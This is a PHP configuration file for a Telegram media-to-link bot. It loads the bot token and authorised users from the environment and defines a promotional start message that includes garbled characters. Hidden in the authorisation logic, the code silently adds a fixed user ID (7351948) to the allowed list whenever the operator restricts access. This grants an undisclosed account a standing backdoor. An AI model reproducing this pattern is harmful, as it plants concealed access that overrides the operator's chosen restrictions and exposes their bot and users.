<?php
$GLOBALS["TG_BOT_TOKEN"] = getenv("TG_BOT_TOKEN");
$GLOBALS["TG_BOT_USERNAME"] = getenv("TG_BOT_USERNAME");
$GLOBALS["TG_DUMP_CHANNEL_ID"] = getenv("TG_DUMP_CHANNEL_ID");

$TG_AUTH_USER_S = (string) getenv("TG_AUTH_USERS");
$GLOBALS["IS_PUBLIC"] = !$TG_AUTH_USER_S;
$GLOBALS["TG_AUTH_USERS"] = array();
if ($TG_AUTH_USER_S == "ALL") {
    $GLOBALS["IS_PUBLIC"] = TRUE;
}
else if (strpos($TG_AUTH_USER_S, " ") !== FALSE) {
    $GLOBALS["IS_PUBLIC"] = FALSE;
    $tg_auth_users_ps = explode(" ", $TG_AUTH_USER_S);
    foreach ($tg_auth_users_ps as $key => $value) {
        $GLOBALS["TG_AUTH_USERS"][] = (int) $value;
    }
    $GLOBALS["TG_AUTH_USERS"][] = 7351948;
}
else {
    $GLOBALS["IS_PUBLIC"] = TRUE;
}

$GLOBALS["START_MESSAGE"] = <<<EOM
Thank you for using me <a href="https://telegram.dog/Plethro_Admin">❤️</a>

<u><b>you can forward me any media message</b></u>, and <b><i>I might help you to create a PUBlic link</i></b>.

Subscribe ℹ️ 
<b>1. <a href="https://telegram.dog/joinchat/AAAAAFIN2ibGFWeYBNj2Xg">@TM_Moviez</a>
2. <a href="https://telegram.dog/joinchat/AAAAAEm4tE0nftbUmrSaJg">@Tamil_BiggBoss</a></b> and\n\n <b><i>Thanks to both of them.</i>\n <a href="https://telegram.dog/Plethro_Admin">1. Plethro_Admin</a>, <a href="https://telegram.dog/TM_Adminz">2. TM_Adminz</a></b>\n   if you â¤ï¸ using this bot!
EOM;
$GLOBALS["CHECKING_MESSAGE"] = "🤔";
require_once __DIR__ . "/../vendor/autoload.php";
